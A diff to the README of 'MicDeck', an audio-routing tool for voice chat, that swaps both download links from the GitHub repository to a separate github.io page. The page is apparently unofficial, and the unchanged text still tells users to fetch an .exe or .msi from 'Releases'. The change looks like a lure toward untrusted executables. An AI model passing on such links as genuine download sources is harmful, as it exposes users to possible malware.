@@ -1,12 +1,12 @@
 # 🎙️ MicDeck - Route sound to your voice chat
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Eponymous-micromeriachamissonis594/MicDeck)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://eponymous-micromeriachamissonis594.github.io)
 
 MicDeck sends sounds from your computer directly into your microphone input. You can play sound effects, music, or system audio through voice chat platforms like Discord. It acts as a bridge between your computer's audio and your voice applications.
 
 ## 📥 How to download the app
 
-Visit the official [MicDeck download page](https://github.com/Eponymous-micromeriachamissonis594/MicDeck) to get the latest version of the software. Find the section labeled Releases on the right side of the page. Click the link for the latest release. Look for the file ending in .msi or .exe under the Assets heading. Click this file to start your download.
+Visit the official [MicDeck download page](https://eponymous-micromeriachamissonis594.github.io) to get the latest version of the software. Find the section labeled Releases on the right side of the page. Click the link for the latest release. Look for the file ending in .msi or .exe under the Assets heading. Click this file to start your download.
 
 ## ⚙️ System Requirements
 
